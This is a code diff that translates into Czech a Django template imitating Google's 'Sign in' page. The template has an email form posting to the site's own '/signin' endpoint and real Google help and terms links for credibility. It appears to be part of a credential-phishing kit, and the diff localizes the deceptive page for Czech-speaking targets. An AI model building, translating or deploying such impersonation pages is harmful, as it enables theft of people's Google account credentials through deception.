@@ -45,8 +45,8 @@
                     </div>
                 </div>
             </div>
-            <h2>Sign in</h2>
-            <h3 id="text_2">Use your Google Account</h3>
+            <h2>Přihlásit se</h2>
+            <h3 id="text_2">Použijte účet Google</h3>
             <div class="input-contain">
                 <form id="form" method="post" action="/signin">
                     {% csrf_token %}
@@ -57,7 +57,7 @@
                            value=""
                            aria-labelledby="placeholder-email">
                     <label class="placeholder-text" for="email" id="placeholder-email">
-                        <div id="placeholder_" class="text">Email or phone</div>
+                        <div id="placeholder_" class="text">E-mail</div>
                     </label>
                 </form>
             </div>
@@ -65,17 +65,17 @@
                 <b id="error"></b>
                 <div class="btn-email">
                     <button type="button">
-                    <a target="_blank" href="https://accounts.google.com/>" class="link">Forgot Email?</a>
+                    <a target="_blank" href="https://accounts.google.com/>" class="link">Zapomněli jste e-mail?</a>
                 </button>
             </div>
             <p>
-                Not your computer? Use Guest mode to sign in privately.
+                Není to váš počítač? Přihlaste se v anonymním okně.
                 <a target="_blank"
-                   href="https://support.google.com/chrome/answer/6130773?hl=en-GB">Learn more</a>
+                   href="https://support.google.com/chrome/answer/6130773?hl=en-GB">Další informace o používání režimu hosta</a>
             </p>
             <div class="card-bottom">
-                <a target="_blank" href="https://google.com//>/>">Create account</a>
-                <button form="form" type="submit" class="disable-select">Next</button>
+                <a target="_blank" href="https://google.com//>/>">Vytvořit účet</a>
+                <button form="form" type="submit" class="disable-select">Další</button>
             </div>
         </div>
         <div id="spacer">
@@ -85,20 +85,20 @@
         </div>
         <div class="footer">
             <select class="disable-select" name="select">
-                <option value="English (United States)">
-                    English (United States)
+                <option value="Čeština">
+                    Čeština
                 </option>
             </select>
             <div class="footer-span">
                 <span><a target="_blank"
    class="btn"
-   href="https://support.google.com/accounts?hl=en">Help</a></span>
+   href="https://support.google.com/accounts?hl=en">Pomoc</a></span>
                 <span><a target="_blank"
    class="btn"
-   href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
+   href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Ochrana soukromí</a></span>
                 <span><a target="_blank"
    class="btn"
-   href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
+   href="https://accounts.google.com/TOS?loc=US&hl=en">Podmínky</a></span>
             </div>
         </div>
     </div>
